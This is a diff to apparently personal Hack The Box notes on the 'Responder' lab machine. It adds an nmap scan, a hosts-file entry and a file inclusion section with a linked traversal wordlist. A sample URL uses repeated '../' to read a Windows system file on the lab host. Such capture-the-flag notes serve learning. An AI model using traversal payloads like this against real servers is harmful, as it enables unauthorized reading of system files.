@@ -161,3 +161,8 @@ nmap -p- --min-rate 5000 -sV
   - ```echo "{target_IP} unika.htb" | sudo tee -a /etc/hosts```
 
 ![responder_unika2](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/responder_unika2.png?raw=true)
+
+-File Inclusion vulnerability
+ - multiple ../ strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. ```C:\```
+ - https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+ - ```http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts```
